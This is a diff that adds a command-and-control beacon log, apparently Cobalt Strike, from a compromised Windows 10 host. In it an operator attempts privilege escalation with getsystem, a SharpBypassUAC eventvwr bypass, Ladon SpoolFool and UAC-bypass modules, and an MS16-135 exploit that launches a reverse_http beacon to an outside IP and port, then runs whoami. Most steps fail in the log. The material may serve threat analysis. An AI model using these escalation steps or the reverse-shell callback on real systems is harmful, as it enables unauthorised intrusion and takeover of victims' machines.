@@ -1,0 +1,27 @@
+12/13 18:47:29 UTC [metadata] 119.59.96.90 <- 119.59.96.90; computer: WIN-JD2F1JSLVPH; user: Malicious UserName; process: jh.exe; pid: 31588; os: Windows; version: 10.0; build: 14393; beacon arch: x64 (x64)
+12/13 18:49:11 UTC [input] <jhc> getsystem
+12/13 18:49:11 UTC [task] <T1134> Tasked beacon to get SYSTEM
+12/13 18:49:14 UTC [checkin] host called home, sent: 2743 bytes
+12/13 18:49:16 UTC [output]
+received output:
+getsystem failed.
+
+12/13 18:49:31 UTC [task] <T1093> Tasked beacon to run .NET program: SharpBypassUAC.exe -b eventvwr -e VALUE Base64 encoded command to execute
+12/13 18:49:33 UTC [checkin] host called home, sent: 131223 bytes
+12/13 18:49:34 UTC [error] could not spawn C:\Windows\system32\rundll32.exe: 2
+12/13 18:49:45 UTC [output]
+Ladon SpoolFool 
+
+12/13 18:49:45 UTC [error] Ladon.exe does not exist :(
+12/13 18:50:12 UTC [output]
+Ladon BypassUAC BypassUac2
+
+12/13 18:50:12 UTC [error] Ladon.exe does not exist :(
+12/13 18:50:24 UTC [task] <> Tasked Beacon to run windows/beacon_http/reverse_http (185.254.97.245:1438) MS16-135
+12/13 18:50:25 UTC [checkin] host called home, sent: 147731 bytes
+12/13 18:50:47 UTC [error] could not spawn C:\Windows\system32\rundll32.exe: 2
+12/13 18:50:47 UTC [error] Could not connect to pipe: 2
+12/13 18:50:53 UTC [input] <jhc> shell whoami
+12/13 18:50:53 UTC [task] <T1059> Tasked beacon to run: whoami
+12/13 18:50:53 UTC [checkin] host called home, sent: 37 bytes
+12/13 18:50:54 UTC [error] could not spawn C:\Windows\system32\cmd.exe /C whoami: 2
